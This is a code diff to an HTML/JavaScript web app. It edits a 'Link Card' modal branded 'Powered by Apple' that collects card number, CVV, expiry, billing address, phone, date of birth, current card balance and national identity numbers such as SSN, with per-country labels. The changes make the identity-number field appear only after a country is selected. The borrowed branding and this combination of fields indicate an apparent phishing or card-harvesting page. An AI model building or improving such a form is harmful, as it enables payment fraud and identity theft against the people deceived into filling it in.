@@ -622,7 +622,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="cards-list-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Linked Cards</h3><button class="modal-close" onclick="closeModal('cards-list-modal')">&#215;</button></div><div id="cards-list-content"></div></div></div>
 
-<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;margin-bottom:10px;"><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Card Expiry</label><input type="month" class="modal-input" id="card-expiry" data-i18n="expiry" style="color-scheme:dark;margin-top:0;margin-bottom:0;"></div><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">CVV</label><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" data-i18n="cvv" maxlength="4" inputmode="numeric" style="margin-top:0;margin-bottom:0;"></div></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><select class="modal-input" id="card-country-field"><option value="">Select Country</option><option value="United States">🇺🇸 United States</option><option value="United Kingdom">🇬🇧 United Kingdom</option><option value="Canada">🇨🇦 Canada</option><option value="Australia">🇦🇺 Australia</option><option value="Germany">🇩🇪 Germany</option><option value="France">🇫🇷 France</option><option value="Spain">🇪🇸 Spain</option><option value="Italy">🇮🇹 Italy</option><option value="Portugal">🇵🇹 Portugal</option><option value="Netherlands">🇳🇱 Netherlands</option><option value="Belgium">🇧🇪 Belgium</option><option value="Switzerland">🇨🇭 Switzerland</option><option value="Austria">🇦🇹 Austria</option><option value="Sweden">🇸🇪 Sweden</option><option value="Norway">🇳🇴 Norway</option><option value="Denmark">🇩🇰 Denmark</option><option value="Finland">🇫🇮 Finland</option><option value="Ireland">🇮🇪 Ireland</option><option value="Poland">🇵🇱 Poland</option><option value="Czech Republic">🇨🇿 Czech Republic</option><option value="Greece">🇬🇷 Greece</option><option value="Brazil">🇧🇷 Brazil</option><option value="Mexico">🇲🇽 Mexico</option><option value="Argentina">🇦🇷 Argentina</option><option value="Chile">🇨🇱 Chile</option><option value="Colombia">🇨🇴 Colombia</option><option value="India">🇮🇳 India</option><option value="China">🇨🇳 China</option><option value="Japan">🇯🇵 Japan</option><option value="South Korea">🇰🇷 South Korea</option><option value="Singapore">🇸🇬 Singapore</option><option value="Malaysia">🇲🇾 Malaysia</option><option value="Thailand">🇹🇭 Thailand</option><option value="Philippines">🇵🇭 Philippines</option><option value="Indonesia">🇮🇩 Indonesia</option><option value="Vietnam">🇻🇳 Vietnam</option><option value="Nigeria">🇳🇬 Nigeria</option><option value="South Africa">🇿🇦 South Africa</option><option value="Kenya">🇰🇪 Kenya</option><option value="Egypt">🇪🇬 Egypt</option><option value="Ghana">🇬🇭 Ghana</option><option value="United Arab Emirates">🇦🇪 UAE</option><option value="Saudi Arabia">🇸🇦 Saudi Arabia</option><option value="Israel">🇮🇱 Israel</option><option value="Turkey">🇹🇷 Turkey</option><option value="New Zealand">🇳🇿 New Zealand</option></select><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"><div style="margin-top:4px;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Date of Birth</label><input type="date" class="modal-input" id="card-dob" style="color-scheme:dark;margin-top:0;"></div><div style="margin-top:4px;"><label id="tax-id-label" style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Tax ID Number</label><input type="text" class="modal-input" id="card-tax-id" maxlength="20" style="margin-top:0;"></div></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
+<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;margin-bottom:10px;"><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Card Expiry</label><input type="month" class="modal-input" id="card-expiry" data-i18n="expiry" style="color-scheme:dark;margin-top:0;margin-bottom:0;"></div><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">CVV</label><input type="text" class="modal-input" id="card-cvv" data-i18n="cvv" maxlength="4" inputmode="numeric" style="margin-top:0;margin-bottom:0;"></div></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><select class="modal-input" id="card-country-field"><option value="">Select Country</option><option value="United States">🇺🇸 United States</option><option value="United Kingdom">🇬🇧 United Kingdom</option><option value="Canada">🇨🇦 Canada</option><option value="Australia">🇦🇺 Australia</option><option value="Germany">🇩🇪 Germany</option><option value="France">🇫🇷 France</option><option value="Spain">🇪🇸 Spain</option><option value="Italy">🇮🇹 Italy</option><option value="Portugal">🇵🇹 Portugal</option><option value="Netherlands">🇳🇱 Netherlands</option><option value="Belgium">🇧🇪 Belgium</option><option value="Switzerland">🇨🇭 Switzerland</option><option value="Austria">🇦🇹 Austria</option><option value="Sweden">🇸🇪 Sweden</option><option value="Norway">🇳🇴 Norway</option><option value="Denmark">🇩🇰 Denmark</option><option value="Finland">🇫🇮 Finland</option><option value="Ireland">🇮🇪 Ireland</option><option value="Poland">🇵🇱 Poland</option><option value="Czech Republic">🇨🇿 Czech Republic</option><option value="Greece">🇬🇷 Greece</option><option value="Brazil">🇧🇷 Brazil</option><option value="Mexico">🇲🇽 Mexico</option><option value="Argentina">🇦🇷 Argentina</option><option value="Chile">🇨🇱 Chile</option><option value="Colombia">🇨🇴 Colombia</option><option value="India">🇮🇳 India</option><option value="China">🇨🇳 China</option><option value="Japan">🇯🇵 Japan</option><option value="South Korea">🇰🇷 South Korea</option><option value="Singapore">🇸🇬 Singapore</option><option value="Malaysia">🇲🇾 Malaysia</option><option value="Thailand">🇹🇭 Thailand</option><option value="Philippines">🇵🇭 Philippines</option><option value="Indonesia">🇮🇩 Indonesia</option><option value="Vietnam">🇻🇳 Vietnam</option><option value="Nigeria">🇳🇬 Nigeria</option><option value="South Africa">🇿🇦 South Africa</option><option value="Kenya">🇰🇪 Kenya</option><option value="Egypt">🇪🇬 Egypt</option><option value="Ghana">🇬🇭 Ghana</option><option value="United Arab Emirates">🇦🇪 UAE</option><option value="Saudi Arabia">🇸🇦 Saudi Arabia</option><option value="Israel">🇮🇱 Israel</option><option value="Turkey">🇹🇷 Turkey</option><option value="New Zealand">🇳🇿 New Zealand</option></select><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"><div style="margin-top:4px;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Date of Birth</label><input type="date" class="modal-input" id="card-dob" style="color-scheme:dark;margin-top:0;"></div><div id="tax-id-container" style="margin-top:4px;display:none;"><label id="tax-id-label" style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;padding-left:2px;">Tax ID</label><input type="text" class="modal-input" id="card-tax-id" maxlength="20" style="margin-top:0;"></div></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
 <div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px 14px;margin:6px 0 10px;display:flex;gap:10px;align-items:flex-start;">
   <div style="flex-shrink:0;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
   <div>
@@ -2035,21 +2035,43 @@ $('add-new-card-btn').onclick=function(){
   ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance','card-dob','card-tax-id'].forEach(function(id){var el=$(id);if(el)el.value='';});
   $('card-error').textContent='';
   
-  // Pre-select user's country if available
-  var countryField=$('card-country-field');
-  if(countryField && userData.country){
-    countryField.value=userData.country;
-    updateTaxIdLabel(userData.country);
-  }
-  
   openModal('card-modal');
+  
+  // Set up country change event listener
+  setTimeout(function(){
+    var countryField=$('card-country-field');
+    if(countryField){
+      // Remove old listener if exists
+      var newCountryField=countryField.cloneNode(true);
+      countryField.parentNode.replaceChild(newCountryField, countryField);
+      
+      // Add new listener
+      newCountryField.addEventListener('change', function(){
+        updateTaxIdLabel(this.value);
+      });
+      
+      // Pre-select user's country if available
+      if(userData.country){
+        newCountryField.value=userData.country;
+        updateTaxIdLabel(userData.country);
+      }
+    }
+  }, 50);
 };
 
 // Function to update tax ID label based on country
 function updateTaxIdLabel(country){
   var taxIdField=$('card-tax-id');
   var taxIdLabel=$('tax-id-label');
-  if(!taxIdField || !taxIdLabel) return;
+  var taxIdContainer=$('tax-id-container');
+  
+  if(!taxIdField || !taxIdLabel || !taxIdContainer) return;
+  
+  // If no country selected, hide the tax ID field
+  if(!country){
+    taxIdContainer.style.display='none';
+    return;
+  }
   
   var taxIdInfo={
     'United States':{label:'SSN / ITIN', placeholder:'Enter your SSN or ITIN'},
@@ -2092,23 +2114,20 @@ function updateTaxIdLabel(country){
     'Poland':{label:'PESEL', placeholder:'Enter your PESEL'},
     'Czech Republic':{label:'Rodné číslo', placeholder:'Enter your Rodné číslo'},
     'Greece':{label:'AFM', placeholder:'Enter your AFM'},
-    'New Zealand':{label:'IRD Number', placeholder:'Enter your IRD Number'}
+    'New Zealand':{label:'IRD Number', placeholder:'Enter your IRD Number'},
+    'Thailand':{label:'Tax ID', placeholder:'Enter your Tax ID'},
+    'Philippines':{label:'TIN', placeholder:'Enter your TIN'},
+    'Indonesia':{label:'NPWP', placeholder:'Enter your NPWP'},
+    'Vietnam':{label:'Tax Code', placeholder:'Enter your Tax Code'},
+    'Ghana':{label:'TIN', placeholder:'Enter your TIN'}
   };
   
-  var info=taxIdInfo[country]||{label:'Tax ID Number', placeholder:'Enter your Tax ID'};
+  var info=taxIdInfo[country]||{label:'Tax ID', placeholder:'Enter your Tax ID'};
   taxIdLabel.textContent=info.label;
   taxIdField.placeholder=info.placeholder;
+  taxIdContainer.style.display='block';
 }
 
-// Add event listener to country dropdown
-document.addEventListener('DOMContentLoaded', function(){
-  var countryField=$('card-country-field');
-  if(countryField){
-    countryField.addEventListener('change', function(){
-      updateTaxIdLabel(this.value);
-    });
-  }
-});
 $('card-submit-btn').onclick=function(){
   var err=$('card-error');err.textContent='';
   var num=$('card-number').value.replace(/\D/g,'');
